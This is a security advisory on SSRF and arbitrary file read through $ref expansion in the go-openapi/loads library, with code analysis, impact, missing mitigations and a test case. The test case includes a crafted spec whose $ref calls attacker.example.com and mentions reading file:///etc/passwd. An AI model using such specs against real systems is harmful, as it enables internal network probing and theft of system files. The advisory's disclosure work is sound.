### Vulnerability List

- Vulnerability Name: Server-Side Request Forgery (SSRF) and Potential Arbitrary File Read via Spec Expansion
- Description:
    1. An attacker crafts a malicious OpenAPI specification document (YAML or JSON).
    2. In this specification, the attacker includes an external `$ref` field that points to a URL under their control or to an internal resource, or a local file path.
    3. The application using `go-openapi/loads` library loads and parses this malicious specification using `loads.Spec()` or `loads.JSONSpec()` or similar functions.
    4. When the application attempts to expand the specification using `doc.Expanded()`, the `go-openapi/loads` library, through its dependency `go-openapi/spec`, resolves the external `$ref`.
    5. The library makes an HTTP GET request to the URL specified in the `$ref` field without proper validation or sanitization of the URL scheme or target host. The `Load()` method in the loader performs only a basic `url.Parse()` check, without disallowing any URL schemes.
    6. If the URL points to an external attacker-controlled server, the attacker can observe the incoming request, confirming the SSRF vulnerability.
    7. If the URL points to an internal resource, the attacker might be able to access or interact with internal services, depending on network configuration and application context.
    8. If the URL points to a local file (e.g., using `file:///etc/passwd`), and the loader supports the `file://` scheme, the application may attempt to read the local file, leading to arbitrary file read.
- Impact:
    - Server-Side Request Forgery (SSRF): An attacker can potentially probe and interact with internal services that are not intended to be publicly accessible. This can lead to information disclosure, access to administrative interfaces, or further lateral movement within the target environment.
    - Arbitrary File Read: If the loader is configured to handle file URLs and doesn't have proper sanitization, an attacker could potentially read sensitive files from the server's file system, such as configuration files, application code, or data files. This can lead to sensitive data disclosure.
    - Information Disclosure: An attacker can potentially access sensitive information from internal network resources or the local file system if the application server has access.
    - Internal Network Scanning: The attacker can use the application server to scan internal network ports and identify running services.
    - Access to Internal APIs: The attacker might gain unauthorized access to internal APIs and functionalities.
    - Data Exfiltration: In some scenarios, the attacker could exfiltrate data by sending it to an external server they control.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
    - None. The provided code in `go-openapi/loads` does not implement any specific mitigations against SSRF or arbitrary file read during spec expansion. The code performs a basic URL parsing using `url.Parse()` before passing the URL to the loader function, but no further validation (such as enforcing a whitelist of allowed schemes or host validation) is performed. It relies on the default behavior of the `go-openapi/spec` library and standard Go HTTP client, which will follow external URLs.
- Missing Mitigations:
    - Input validation and sanitization for `$ref` URLs: The library should validate and sanitize URLs used in `$ref` fields to prevent loading of potentially dangerous resources. This could include:
        - Restricting URL schemes: Allow only `http` and `https` schemes for remote URLs and explicitly disallow `file`, `gopher`, or other schemes that could lead to local file access or other vulnerabilities.
        - Domain/IP address filtering: Implement a whitelist or blacklist for allowed domains or IP address ranges to prevent requests to internal networks or specific sensitive hosts.
        - Path sanitization: For file paths (if file scheme is to be supported at all, which is generally discouraged for security reasons), ensure proper sanitization to prevent directory traversal attacks.
    - Restricting or disabling remote references: Provide an option to completely disable the resolution of remote `$ref`s altogether, especially for environments where external references are not expected or desired.
    - Whitelisting trusted sources: Implementing safeguards to ensure that only trusted sources may be used to load specifications.
    - Setting timeouts for HTTP requests made to resolve external `$ref` URLs to prevent slow requests from causing delays or resource exhaustion.
    - Sandboxing or isolation: If possible, the spec loading and expansion process should be sandboxed or isolated to limit the potential impact of SSRF or file read vulnerabilities. This could involve running the process in a restricted environment with limited network and file system access.
- Preconditions:
    - The application uses the `go-openapi/loads` library to load and expand OpenAPI specifications.
    - The application exposes functionality (either via an API endpoint or configuration) that passes a user‑controlled URL/path or spec content to the spec loader (e.g. via `loads.Spec()` or `loads.JSONSpec()`).
    - The application loads OpenAPI specifications from untrusted sources or allows users to provide specifications that are then processed.
    - The application calls the `doc.Expanded()` function on the loaded specification document, triggering the resolution of `$ref`s.
    - The application is deployed in an environment where SSRF can lead to access to sensitive internal resources or where arbitrary file read can expose sensitive local files.
    - The attacker needs to be able to control the input specification, so that they can submit a URL with a disallowed scheme or one that causes internal resource access.
- Source Code Analysis:
    1. **`spec.go:Spec(path string, options ...LoaderOption)` and `spec.go:JSONSpec(path string, options ...LoaderOption)`**: These functions are the entry points for loading OpenAPI specifications from a given path (URL or file path). They use a `loader` to fetch the raw specification content.
    2. **`spec.go:Document.Expanded(options ...*spec.ExpandOptions)`**: This function is responsible for expanding `$ref`s within the loaded specification. It configures and calls `spec.ExpandSpec()` from the `go-openapi/spec` library, passing a `PathLoader` function.
    3. **`loaders.go:loader.Load(path string)`**: This function is the default `PathLoader`. It iterates through a chain of `DocLoaderWithMatch` loaders to find one that can load the resource at the given `path`.
        ```go
        func (l *loader) Load(path string) (json.RawMessage, error) {
            _, erp := url.Parse(path) // URL is parsed, but no validation is done to restrict schemes or hosts
            if erp != nil {
                return nil, erp
            }

            lastErr := errors.New("no loader matched") // default error if no match was found
            for ldr := l; ldr != nil; ldr = ldr.Next {
                if ldr.Match != nil && !ldr.Match(path) {
                    continue
                }

                // try then move to next one if there is an error
                b, err := ldr.Fn(path) // ldr.Fn is called to load the resource
                if err == nil {
                    return b, nil // Resource content is returned if loaded successfully
                }

                lastErr = err
            }

            return nil, lastErr
        }
        ```
        - `loader.Load()` parses the URL using `url.Parse(path)`, but it does not perform any validation or sanitization to restrict the URL scheme, host, or path. It only checks for basic URL syntax correctness.
        - It iterates through the configured loaders (`ldr.Fn`) and calls the first matching loader's function to load the resource.
    4. **`loaders.go:JSONDoc(path string)`**: This is one of the default loaders in the chain. It uses `swag.LoadFromFileOrHTTP(path)` from the `github.com/go-openapi/swag` library to load the document.
        ```go
        func JSONDoc(path string) (json.RawMessage, error) {
            data, err := swag.LoadFromFileOrHTTP(path) // swag.LoadFromFileOrHTTP is used to load content
            if err != nil {
                return nil, err
            }
            return json.RawMessage(data), nil
        }
        ```
        - `JSONDoc()` uses `swag.LoadFromFileOrHTTP(path)` to actually fetch the content from the given path. This function in `github.com/go-openapi/swag` handles both file paths and HTTP URLs and uses `http.Get()` to fetch content from URLs. There is no input validation, sanitization, or restriction on the URLs being fetched within `go-openapi/loads` itself.

        ```mermaid
        graph LR
            A[loads.Spec/JSONSpec] --> B(Document Creation);
            B --> C(Document.Expanded);
            C --> D{expandOptions.PathLoader};
            D -- Uses Document Loader --> E[Document Loader (d.pathLoader.Load)];
            D -- Uses Package Loader --> F[Package Loader (loaders.Load)];
            E --> G{loader.Load};
            F --> G;
            G --> H{URL Parse (url.Parse)};
            H --> I{Loader Chain Iteration};
            I -- Matching Loader Found --> J[ldr.Fn (e.g., JSONDoc)];
            J --> K[JSONDoc];
            K --> L[swag.LoadFromFileOrHTTP(path)];
            L --> M{External Resource (HTTP/File)};
            M -- SSRF/Arbitrary File Read --> N[Attacker Access];
            I -- No Matching Loader --> O[Error];
        ```

- Security Test Case:
    1. **Attacker Setup**:
        - The attacker sets up a publicly accessible server (e.g., `attacker.example.com`) to monitor incoming HTTP requests. For example, using `netcat` or a simple HTTP server.
    2. **Malicious Specification Creation**:
        - The attacker crafts a malicious OpenAPI specification (e.g., `malicious_spec.yaml`) hosted on the attacker's server or provided directly to the application if possible. This specification contains a `$ref` pointing to an internal resource or the attacker's server:
        ```yaml
        swagger: "2.0"
        info:
          version: "1.0.0"
          title: SSRF Test Spec
        paths:
          /test:
            get:
              responses:
                '200':
                  description: Success
                  schema:
                    $ref: 'http://attacker.example.com/ssrf_test' # Or 'file:///etc/passwd' for file read test
        ```
    3. **Application Interaction**:
        - The attacker interacts with the target application in a way that causes it to load and expand the malicious OpenAPI specification. This could involve:
            - Providing the URL of `malicious_spec.yaml` to an endpoint that loads specs from URLs.
            - Uploading `malicious_spec.yaml` to an endpoint that accepts spec files.
            - If the application uses a publicly accessible OpenAPI endpoint, the attacker replaces the legitimate spec with the malicious one.
    4. **Trigger Spec Loading and Expansion**:
        - The attacker triggers the application to load and expand the specification. This is application-specific, but might involve accessing an API endpoint that uses the loaded specification.
    5. **Verification of SSRF/Arbitrary File Read**:
        - **For SSRF**: The attacker checks the logs of their server (`attacker.example.com`). If the application is vulnerable to SSRF, the attacker's server will receive an HTTP request from the target application's server when the `doc.Expanded()` function is called. The request will be for the path specified in the `$ref` (e.g., `/ssrf_test`).
        - **For Arbitrary File Read**: The attacker crafts the `$ref` to point to a sensitive file (e.g., `file:///etc/passwd`).  The behavior depends on how the application handles errors and responses. The attacker might observe:
            - Error messages in the application's response that indicate a file access attempt.
            - Changes in application behavior or responses that suggest the file content has been processed (though direct file content might not be returned to the attacker in a typical SSRF scenario, information leakage can still occur through error messages or side-effects).
    6. **Analysis**:
        - If the attacker's server receives a request (for SSRF) or if there are indications of file access (for arbitrary file read), the vulnerability is confirmed. The attacker documents the successful SSRF or arbitrary file read, including request details, response analysis, and potential impact.